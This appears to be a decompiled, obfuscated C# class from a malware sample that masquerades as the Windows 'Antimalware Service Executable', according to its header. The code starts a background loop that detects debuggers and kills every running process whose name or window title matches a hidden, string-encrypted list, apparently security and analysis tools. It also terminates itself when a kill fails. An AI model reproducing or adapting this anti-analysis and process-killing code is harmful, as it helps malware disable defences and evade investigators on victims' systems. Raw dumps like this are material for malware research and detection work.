// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Antimalware Service Executable, Version=4.18.2110.6, Culture=neutral, PublicKeyToken=null
// MVID: BAA675AC-450F-4411-0EC7-1781EC73690A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-DangerousObject.Multi.Generic-1b75e4ffe67a5c5a8939c62c1028556f3995341d39f5aed9129637646f7b6e5f.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;

internal sealed class \u0006\u2000 : \u0008\u2000
{
  internal static void \u0002() => new Thread(new ThreadStart(\u0006\u2000.\u0003)).Start();

  private static bool \u0002()
  {
    bool flag = false;
    foreach (ProcessModule module in (ReadOnlyCollectionBase) Process.GetCurrentProcess().Modules)
    {
      if (module.ModuleName.EndsWith(\u000E\u2001.\u0002(-2006067394)))
        flag = true;
    }
    return Debugger.IsAttached | !flag;
  }

  private static void \u0003()
  {
    string[] strArray = new string[32]
    {
      \u000E\u2001.\u0002(-2006067412),
      \u000E\u2001.\u0002(-2006067426),
      \u000E\u2001.\u0002(-2006067443),
      \u000E\u2001.\u0002(-2006067456),
      \u000E\u2001.\u0002(-2006067340),
      \u000E\u2001.\u0002(-2006067355),
      \u000E\u2001.\u0002(-2006067361),
      \u000E\u2001.\u0002(-2006067390),
      \u000E\u2001.\u0002(-2006067539),
      \u000E\u2001.\u0002(-2006067554),
      \u000E\u2001.\u0002(-2006067568),
      \u000E\u2001.\u0002(-2006067578),
      \u000E\u2001.\u0002(-2006067470),
      \u000E\u2001.\u0002(-2006067488),
      \u000E\u2001.\u0002(-2006067497),
      \u000E\u2001.\u0002(-2006067510),
      \u000E\u2001.\u0002(-2006067650),
      \u000E\u2001.\u0002(-2006067668),
      \u000E\u2001.\u0002(-2006067680),
      \u000E\u2001.\u0002(-2006067697),
      \u000E\u2001.\u0002(-2006067712),
      \u000E\u2001.\u0002(-2006067603),
      \u000E\u2001.\u0002(-2006067619),
      \u000E\u2001.\u0002(-2006067629),
      \u000E\u2001.\u0002(-2006067645),
      \u000E\u2001.\u0002(-2006066765),
      \u000E\u2001.\u0002(-2006066781),
      \u000E\u2001.\u0002(-2006066801),
      \u000E\u2001.\u0002(-2006066690),
      \u000E\u2001.\u0002(-2006066710),
      \u000E\u2001.\u0002(-2006066735),
      \u000E\u2001.\u0002(-2006066882)
    };
    List<string> stringList = new List<string>()
    {
      \u000E\u2001.\u0002(-2006066901),
      \u000E\u2001.\u0002(-2006066924),
      \u000E\u2001.\u0002(-2006066821),
      \u000E\u2001.\u0002(-2006066834),
      \u000E\u2001.\u0002(-2006066857),
      \u000E\u2001.\u0002(-2006066821),
      \u000E\u2001.\u0002(-2006067017),
      \u000E\u2001.\u0002(-2006067030)
    };
    Debugger.Log(0, (string) null, \u000E\u2001.\u0002(-2006067048));
    while (true)
    {
      if (!Debugger.IsAttached && !Debugger.IsLogging())
        \u0006\u2000.\u0002();
      foreach (Process process in Process.GetProcesses())
      {
        if (process != Process.GetCurrentProcess())
        {
          for (int index = 0; index < strArray.Length; ++index)
          {
            if (process.ProcessName.ToLower().Contains(strArray[index]))
            {
              if (!stringList.Contains(process.ProcessName.ToLower()))
              {
                try
                {
                  process.Kill();
                }
                catch (Exception ex)
                {
                  Process.GetCurrentProcess().Kill();
                }
              }
            }
            if (process.MainWindowTitle.ToLower().Contains(strArray[index]))
            {
              if (!stringList.Contains(process.MainWindowTitle.ToLower()))
              {
                try
                {
                  process.Kill();
                }
                catch (Exception ex)
                {
                  Process.GetCurrentProcess().Kill();
                }
              }
            }
          }
        }
      }
      Thread.Sleep(1000);
    }
  }
}
